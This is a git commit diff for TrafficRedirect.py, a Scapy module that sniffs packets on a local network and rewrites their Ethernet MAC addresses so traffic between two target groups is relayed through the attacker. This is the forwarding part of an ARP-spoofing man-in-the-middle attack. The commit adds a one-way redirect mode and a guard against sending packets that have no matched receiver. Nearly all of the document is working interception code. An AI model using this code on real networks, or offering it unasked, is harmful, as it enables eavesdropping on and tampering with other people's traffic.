797c04f05a97255e69c233e2b53dfd0fa09142a3
andreiagaronian <andrei.agaronian@gmail.com>
2019-03-27 11:34:48 +0100

    Added one-way traffic redirect; Fixed potential bug in traffic resend;

--- TrafficRedirect.py
+++ TrafficRedirect.py
@@ -8,11 +8,12 @@ class TrafficRedirect():
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doRedirect(self, target1, target2, target1MAC, target2MAC):
+    def doRedirect(self, target1, target2, target1MAC, target2MAC, oneway):
 
         def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, interface):
             # if source is target 1 then someone from target 2 must be the true reciever
             if pkt[Ether].src in target1MAC:
+                found = False
                 # find true receiver (the mac of true receiver)
                 receiver = pkt[IP].dst
                 for i in range(len(target2)):
@@ -21,19 +22,45 @@ class TrafficRedirect():
                         pkt[Ether].src = pkt[Ether].dst
                         # set the mac of the true receiver (someone from list target2)
                         pkt[Ether].dst = target2MAC[receiver]
+                        found = True
                         break
                 # send the packet
-                send(pkt, iface=interface)
+                if found:
+                    send(pkt, iface=interface)
             # same but with source target 2
             elif pkt[Ether].src in target2MAC:
+                found = False
                 receiver = pkt[IP].dst
                 for i in range(len(target1)):
                     if receiver == target1[i]:
                         pkt[Ether].src = pkt[Ether].dst
                         pkt[Ether].dst = target1MAC[receiver]
+                        found = True
                         break
-                send(pkt, iface=interface)
+                if found:
+                    send(pkt, iface=interface)
 
-        while True:
-            sniff(count=1, store=0, prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, self.interface),
-                  iface=self.interface)
+        def makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, interface):
+            # if source is target 1 then someone from target 2 must be the true receiver
+            if pkt[Ether].src in target1MAC:
+                found = False
+                # find true receiver (the mac of true receiver)
+                receiver = pkt[IP].dst
+                for i in range(len(target2)):
+                    if receiver == target2[i]:
+                        # we are the source now cause target 2 thinks we are target 1
+                        pkt[Ether].src = pkt[Ether].dst
+                        # set the mac of the true receiver (someone from list target2)
+                        pkt[Ether].dst = target2MAC[receiver]
+                        found = True
+                        break
+                # send the packet
+                if found:
+                    send(pkt, iface=interface)
+
+        if oneway:
+            while True:
+                sniff(count=1, store=0, prn=lambda pkt: makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
+        else:
+            while True:
+                sniff(count=1, store=0, prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, self.interface), iface=self.interface)
